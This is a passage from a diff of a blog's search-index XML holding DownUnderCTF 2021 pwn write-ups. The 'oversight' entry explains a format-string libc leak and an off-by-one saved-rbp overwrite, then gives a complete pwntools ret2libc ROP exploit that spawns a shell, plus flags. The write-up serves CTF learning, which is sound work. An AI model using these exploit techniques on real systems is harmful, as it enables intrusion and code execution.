31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
 ]]></content>
@@ -1579,13 +1664,39 @@ https://www.bsfdvbsbilibili.com
   <entry>
     <title>[writeup][DownUnderCTF 2021] pwn oversight</title>
     <url>/2021/10/09/ductf2021-pwn-oversight/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>this a typical ret2libc problem using rop chain.</p>
+<p>require reveal the base point for libc, find offset and setup ropchain</p>
+<span id="more"></span>
+
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln 1"></a>vuln 1</h3><p>in the <code>sym.wait()</code>, the prinf in the will give a format of <code>&quot;%val$llx&quot;</code>, where val can be input by by users.</p>
+<p>Therefore, we got a way to leak address in the stack (see <a href="/2021/10/09/ductf2021-pwn-leaking-like-a-sieve/">here</a> if your don’t why), which could help to find the <strong>libc</strong> base address</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void wait(void)</span><br><span class="line">&#123;</span><br><span class="line">	// ignored</span><br><span class="line">    printf(&quot;Pick a number: &quot;);</span><br><span class="line">    fgets(&amp;var_85h, 5, _stdin);</span><br><span class="line">    uVar1 = strtol(&amp;var_85h, 0, 10);</span><br><span class="line">    snprintf((int64_t)&amp;var_85h + 5, 100, &quot;Your magic number is: %%%d$llx\n&quot;, uVar1)</span><br><span class="line">    // ignored</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln 2"></a>vuln 2</h3><p>in the <code>sym.echo_inner</code>, we can write max 256(0x100) byte to a 256 byte long char pointer. </p>
+<p>however, the <code>fread</code> will set next byte to zero. </p>
+<p>in this case, since the char pointer is locate at <code>sym.echo</code> and the stack for sym.echo is 0x100 long, the next byte will appear in the save rbp</p>
+<p>since saved rbp is little, the last byte of saved rbp will set to zero, which means the rbp for <code>sym.echo</code> will decrease/move up some position</p>
+<p>for example,</p>
+<p>if the origin rbp of <code>sym.echo</code> is <code>0x1010</code> after <code>fread</code>, it will become <code>0x1000</code>, which decrease by 0x10.</p>
+<p>moreover, the stack above origin rbp is the char array that we can control. by using <code>fread</code>, we can easily construct a stack that do what ever we want.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000012a5      488b0dd42d00.  mov rcx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5 ; [0x4080:8]=0 ; FILE *stream</span><br><span class="line">0x000012ac      e88ffdffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</span><br><span class="line">0x000012b1      488d3d5c0d00.  lea rdi, str.You_said:      ; 0x2014 ; &quot;You said:&quot; ; const char *s</span><br><span class="line">0x000012b8      4898           cdqe</span><br><span class="line">0x000012ba      41c6040400     mov byte [r12 + rax], 0</span><br></pre></td></tr></table></figure>
+<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>check the stack after printf, we can use 5+12 = 17 to leak <code>stdout</code> address.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffe89512620 0x0000000000000d68   h....... @ rsp 3432</span><br><span class="line">0x7ffe89512628 0x00000a373183bad1   ...17...</span><br><span class="line">0x7ffe89512630 0x67616d2072756f59   Your mag @ r12 ascii (&#x27;Y&#x27;)</span><br><span class="line">0x7ffe89512638 0x65626d756e206369   ic numbe ascii (&#x27;i&#x27;)</span><br><span class="line">0x7ffe89512640 0x3125203a73692072   r is: %1 ascii (&#x27;r&#x27;)</span><br><span class="line">0x7ffe89512648 0x00000a786c6c2437   7$llx...</span><br><span class="line">0x7ffe89512650 0x000055c13fc96070   p`.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .bss section..bss,reloc.stdout reloc.__cxa_finalize program R W 0x7fbcb29946a0</span><br><span class="line">0x7ffe89512658 0x00007fbcb29954a0   .T...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0x0</span><br><span class="line">0x7ffe89512660 ..[ null bytes ]..   00000000</span><br><span class="line">0x7ffe89512668 0x00007fbcb283c013   ........ /usr/lib/x86_64-linux-gnu/libc-2.31.so library R X &#x27;cmp eax, 0xffffffff&#x27; &#x27;libc-2.31.so&#x27;</span><br><span class="line">0x7ffe89512670 0x0000000000000010   ........ 16</span><br><span class="line">0x7ffe89512678 0x00007fbcb29946a0   .F...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0xfbad2887</span><br><span class="line">0x7ffe89512680 0x000055c13fc94075   u@.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .rodata str.Lets_play_a_game program R 0x616c70207374654c Lets play a game</span><br></pre></td></tr></table></figure>
+
+<h3 id="construct-stack"><a href="#construct-stack" class="headerlink" title="construct stack"></a>construct stack</h3><p>last 00 are required for alignment</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ rsp</span><br><span class="line">ret;</span><br><span class="line">. (new rbp may land here)</span><br><span class="line">. many ret;</span><br><span class="line">. (or here)</span><br><span class="line">ret;</span><br><span class="line">pop rdi; ret;</span><br><span class="line">pointer of &quot;/bin/sh&quot;</span><br><span class="line">call system</span><br><span class="line">00</span><br><span class="line">@ origin rbp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31909&#x27; oversight</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;oversight&#x27;)</span><br><span class="line">libc = ELF(&quot;libc-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31909)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">def get_pointer(address:int):</span><br><span class="line">    return address.to_bytes(0x8,&quot;little&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line">io.send(b&quot;\n&quot;)</span><br><span class="line">print(123)</span><br><span class="line">io.sendlineafter(b&quot;Pick a number: &quot;,str(5+12).encode())</span><br><span class="line">io.recvuntil(b&quot;Your magic number is: &quot;)</span><br><span class="line">data = io.recv()</span><br><span class="line">print(data)</span><br><span class="line">libc_stdout_address = int(data.decode().split(&quot;\n&quot;)[0],16)</span><br><span class="line">print(libc_stdout_address)</span><br><span class="line">libc_base = libc_stdout_address - 0x003ec760</span><br><span class="line">libc_pop_rdi = libc_base + 0x215bf</span><br><span class="line">libc_ret = libc_base + 0x08aa</span><br><span class="line">libc_bin_sh = libc_base + 0x001b3e1a</span><br><span class="line">libc_system = libc_base + 0x4f550</span><br><span class="line">mystack =  get_pointer(libc_pop_rdi) + get_pointer(libc_bin_sh) + get_pointer(libc_system) + get_pointer(0)</span><br><span class="line">payload = get_pointer(libc_ret)*(256 // 8 -len(mystack) // 8)+mystack</span><br><span class="line">print(&quot;len of payload %d&quot; % (len(payload) / 8))</span><br><span class="line">io.sendline(b&quot;256&quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">print(&quot;recved&quot;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}</p>
+]]></content>
       <tags>
         <tag>writeup</tag>
         <tag>ctf</tag>
         <tag>ductf</tag>
         <tag>pwn</tag>
-        <tag>buffer overflow</tag>
         <tag>ret2libc</tag>
       </tags>
   </entry>
